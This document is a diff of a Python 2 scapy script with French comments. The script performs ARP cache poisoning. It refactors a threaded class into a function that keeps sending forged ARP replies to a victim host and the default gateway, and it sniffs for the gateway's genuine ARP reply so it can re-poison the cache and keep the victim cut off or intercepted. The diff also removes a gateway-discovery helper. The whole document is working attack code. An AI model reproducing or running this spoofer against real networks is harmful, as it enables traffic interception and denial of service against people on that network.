@@ -2,52 +2,6 @@
 # coding: utf-8
 from scapy.all import *
 import netifaces
-from subprocess import Popen, PIPE
-import threading
-import re
-import time 
-  
-class couperVictime(threading.Thread): 
-    def __init__(self, IpVictim, MacVictim, IpGw, MacGw): 
-        threading.Thread.__init__(self)
-        self.Terminated = False 
-	self.IpVictim = IpVictim
-	self.MacVictim = MacVictim
-	self.IpGw = IpGw
-	self.MacGw = MacGw
-    def run(self): 
-        while not self.Terminated: 
-             #Creation du faux paquet pour envoyer a la victime
-		fauxARP = ARP()
-		fauxARP.op = 2
-		fauxARP.psrc = self.IpGw
-		fauxARP.pdst = self.IpVictim
-		fauxARP.hwdst = self.MacVictim
-
-		fauxARPGW = ARP()
-		fauxARPGW.op=2
-		fauxARPGW.psrc= self.IpVictim
-		fauxARPGW.pdst= self.IpGw
-		fauxARPGW.hwdst= self.MacGw
-
-		#On envoie toujours le faux ARP quand le cache n'est pas usurpe
-		
-
-		#On envoie le faux ARP
-		print self.Terminated
-		send(fauxARP)
-		send(fauxARPGW)
-
-		#Apres un moment, le gateway par defaut envoie un ARP pour donner son adresse MAC
-		#La victime n'est plus trompee et la communication ne passe plus par l'attaquant
-		#Pour empecher cela, on sniff la commnucation entre la gateway et la victime 
-		#Des que la gateway envoie une reponse ARP, l'attaquant usurpe la victime
-		sniff(filter="arp and host 192.168.0.1 or host 192.168.0.100", count=1)
-        print "le thread s'est termine proprement" 
-    def stop(self): 
-        self.Terminated = True
-
-
 def main():
 	#Solution provisoire en attendant 
 	#Apres on va prendre les donnees de l'utilisateur
@@ -87,29 +41,31 @@ def couperTous(tabMACIPVictime, tabMACIPGateway):
 			couperVictime(ipV, macV, ipG, macG)
 
 
+def couperVictime(victimeIP, victimeMAC, gatewayIP, gatewayMAC):
+	#Creation du faux paquet pour envoyer a la victime
+	fauxARP = ARP()
+	fauxARP.op = 2
+	fauxARP.psrc = gatewayIP
+	fauxARP.pdst = victimeIP
+	fauxARP.hwdst = victimeMAC
 
+	fauxARPGW = ARP()
+	fauxARPGW.op=2
+	fauxARPGW.psrc=victimeIP
+	fauxARPGW.pdst=gatewayIP
+	fauxARPGW.hwdst=gatewayMAC
 
-def get_default_gateway_linux():
-	"""Read the default gateway directly from /proc."""
-	with open("/proc/net/route") as fh:
-		for line in fh:
-		    fields = line.strip().split()
+	#On envoie toujours le faux ARP quand le cache n'est pas usurpe
+	while True:
 
-		    if fields[1] != '00000000' or not int(fields[3], 16) & 2:
-			continue
+	 #On envoie le faux ARP
+	 send(fauxARP)
+	 send(fauxARPGW)
 
-		    IP = socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
-	
+	 #Apres un moment, le gateway par defaut envoie un ARP pour donner son adresse MAC
+	 #La victime n'est plus trompee et la communication ne passe plus par l'attaquant
+	 #Pour empecher cela, on sniff la commnucation entre la gateway et la victime 
+	 #Des que la gateway envoie une reponse ARP, l'attaquant usurpe la victime
+	 sniff(filter="arp and host 192.168.0.1 or host 192.168.0.100", count=1)
 
-	#IP = "192.168.10.111"
-	Popen(["ping", "-c 1", IP], stdout = PIPE)
-	pid = Popen(["arp", "-n", IP], stdout = PIPE)
-	s = pid.communicate()[0]
-	mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]
-	Tab = []
-	print "Routeur : %s--> %s" % (IP, mac)
-	couple = (IP,mac)
-	Tab.append(couple)
-	return Tab
-
-#main()
+main()
